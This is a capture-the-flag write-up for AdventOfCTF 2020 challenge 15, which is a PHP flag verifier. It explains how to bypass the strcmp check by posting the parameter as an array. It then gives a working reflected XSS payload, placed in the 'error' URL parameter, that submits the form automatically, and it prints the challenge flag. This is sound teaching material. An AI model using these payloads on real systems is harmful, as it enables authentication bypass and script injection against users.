+++
author = "Maik de Kruif"
title = "Juggler++"
subtitle = "Challenge 15 - AdventOfCTF"
date = 2020-12-31T22:34:24+01:00
description = "A writeup for challenge 15 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/9c6afd807a15973b962cf3aee3dbe836.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "php",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1500

## Description

We have now created a flag verifier service. Enter a flag to see if it matches the challenge you are trying to solve.

Visit <https://15.adventofctf.com> to start the challenge.

## Recon

Upon opening the challenge website we're greeted with some PHP code:

```php
<?php

ini_set('display_errors', 0);

include("flag.php");

if (isset($_POST["flag"])) {
    $f = $_POST["flag"];

    if (strcmp($f, $flag) == 0 || sha1($flag) == sha1($f)) {
        echo $flag;
        die();
    }
}

header("Location: /index.php?error=Wrong flag");
exit();
```

Besides this code, we also get an input field for the contents of the `flag` parameter.

## Finding the vulnerability

When scanning this code, we see that `$flag` is compared to our input. It firstly does a `strcmp`, and, if it is not `0`, it checks if the `sha1` hashes of both variables are equal.

The thing with PHP and `strcmp` is that PHP will do some type juggling before checking the values. You can read more about PHP type juggling in the [writeup of yesterday's challenge]({{% ref "writeups/adventofctf/2020/challenge_14.md" %}}#type-juggling).

## Exploit

This time, however, we have to use type juggling in a different way. In PHP, we can also pass arrays as a parameter. We do this by placing brackets after the parameter name like so: `flag[]=a`. And this is exactly how we solve it.

This works as `strcmp("string", [])` will always return 0 because PHP.

We can either use software like burp repeater or cURL to manually create a request, or change the contents of the `name` attribute to `flag[]`.

## Solution

After then making the request, we get the flag: `NOVI{typ3_juggl1ng_f0r_l1fe_seriously}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#15-16).

## Extra

Because this challenge also has an XSS vulnerability, we can use it to solve the challenge automatically for us.

To do this, we firstly have to create some HTML code which executes some javascript code which then actually solves the challenge.

I came up with the following code:

```html
<script>
  setTimeout(() => {
    let flagInput = document.getElementById("flag");
    flagInput.name = "flag[]";
    flagInput.value = "hi";
    flagInput.form.submit();
  }, 1000);
</script>
```

If we then put this in the `error` parameter in the URL, it will solve the challenge automatically. The resulting URL is the following: `https://15.adventofctf.com/index.php?error=<script>setTimeout(()=>{let flagInput=document.getElementById("flag");flagInput.name="flag[]";flagInput.value="hi";flagInput.form.submit()},1000)</script>`.
